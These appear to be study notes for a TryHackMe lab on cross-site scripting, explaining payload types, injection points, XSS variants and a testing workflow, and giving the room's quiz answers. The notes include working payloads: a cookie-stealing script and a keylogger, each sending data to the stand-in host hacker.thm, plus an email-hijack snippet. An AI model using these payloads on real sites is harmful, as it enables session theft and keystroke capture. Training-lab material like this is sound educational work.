# TryHackMe — Intro to Cross-site Scripting (XSS)

## Task 2: XSS Payloads

### 1. What Is an XSS Payload?

An XSS payload is code designed to execute in a user's browser by exploiting a Cross-site Scripting vulnerability.

A payload has two parts:

- **Intention:** What the code is intended to do.
- **Modification:** How the code is adapted to the vulnerable context.

### 2. Proof of Concept (PoC)

**Full payload:**

```html
<script>alert('XSS');</script>
```

**Code breakdown:**

- `<script>` — Starts an HTML script element.
- `alert('XSS')` — Displays a popup containing `XSS`.
- `</script>` — Closes the script element.

**Purpose:** To demonstrate that JavaScript can execute in a webpage.

**Where to use:** An authorized XSS lab's vulnerable input field or URL parameter.

**How to test:**

1. Open the practice lab.
2. Find the input being tested.
3. Enter the payload and submit it.
4. Check whether a popup appears.
5. If it fails, inspect how the application processes the input.

The payload will not execute in every context. HTML encoding, filtering, and the location where the input is inserted can affect execution.

### 3. Session Stealing

**Full payload from the lesson:**

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Code breakdown:**

- `document.cookie` — Reads cookies accessible to JavaScript.
- `btoa()` — Encodes a string using Base64.
- `fetch()` — Sends an HTTP request.
- `?cookie=` — Adds a query parameter intended to carry the encoded value.

**Purpose:** Demonstrates how malicious JavaScript could transmit accessible cookie data.

**Important:** `HttpOnly` cookies cannot be read through `document.cookie`. Base64 is encoding, not encryption. Never send real session cookies to an external server.

### 4. Key Logger

**Full payload from the lesson:**

```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

**Code breakdown:**

- `document.onkeypress` — Assigns a keyboard-event handler.
- `function(e)` — Defines a function receiving the event.
- `e.key` — Identifies the key associated with the event.
- `btoa(e.key)` — Encodes the key in Base64.
- `fetch()` — Sends an HTTP request containing the encoded value.

**Purpose:** Demonstrates how injected JavaScript could capture keystrokes and transmit them.

**Safe testing:** Use a local demonstration that displays test keystrokes on your own page. Do not collect real passwords or monitor other users.

### 5. Business Logic

**Full example from the lesson:**

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Code breakdown:**

- `user` — Represents a JavaScript object.
- `changeEmail()` — Represents a method.
- `'attacker@hacker.thm'` — The argument passed to the method.

**Purpose:** Illustrates how XSS could invoke an application's functionality.

**Important:** This is a hypothetical example. The object and method must exist, and the application must allow the operation. Changing an email address could create further account-security risks.

### 6. Where Are XSS Payloads Used?

**A. Input fields**

Examples: Search boxes, comments, profile fields, and feedback forms.

Test by entering a harmless marker and observing how the application displays it.

**B. URL parameters**

Example:

```text
https://example.com/search?q=test
```

- `q` is the query parameter.
- `test` is its value.

If the application returns this value in an unsafe context, it may be vulnerable to Reflected XSS.

**C. Burp Suite Repeater**

1. Open the authorized lab in your browser.
2. Capture the HTTP request using Burp Suite Proxy.
3. Send the request to Repeater.
4. Locate the relevant input parameter.
5. Change it to a harmless test marker.
6. Send the request and inspect the response.
7. Check the context in which the input is returned.

An HTTP response alone does not always prove that JavaScript executed. Confirm the browser behavior when appropriate.

**D. Stored content**

Some applications save user input and display it later. If that content is rendered unsafely, Stored XSS may occur.

**E. DOM-based input**

Client-side JavaScript may process URL parameters, URL fragments, or other user-controlled values and insert them into the DOM unsafely.

### 7. Types of XSS

**Reflected XSS:** Request-controlled input is immediately returned in an unsafe context.

**Stored XSS:** Malicious input is saved and executes when the application later renders it unsafely.

**DOM-based XSS:** Client-side JavaScript processes untrusted input through an unsafe operation.

### 8. Basic XSS Testing Workflow

1. Identify a user-controlled input.
2. Submit a harmless marker, such as `XSS_TEST_123`.
3. Inspect the request and response.
4. Find where the marker appears.
5. Identify its HTML or JavaScript context.
6. Select an appropriate test for the authorized lab.
7. Check whether JavaScript actually executes.
8. Record the result and explain why the test succeeded or failed.

### 9. Important JavaScript Concepts

| Code | Meaning |
|---|---|
| `alert()` | Displays a browser popup |
| `document.cookie` | Reads JavaScript-accessible cookies |
| `btoa()` | Encodes a string in Base64 |
| `fetch()` | Makes an HTTP request |
| `e.key` | Provides the key associated with a keyboard event |
| `changeEmail()` | Illustrates calling a hypothetical method |
| `<script>` | HTML element used to embed JavaScript |

### 10. TryHackMe Answers

**Q1. Which document property could contain the user's session token?**

Answer: `document.cookie`

**Q2. Which JavaScript method is often used as a Proof Of Concept?**

Answer: `alert()`

### Key Takeaway

XSS occurs when untrusted input is handled in a way that allows unintended JavaScript execution in a user's browser. Successful testing requires understanding where the input enters, how it is processed, and where it appears in the page.
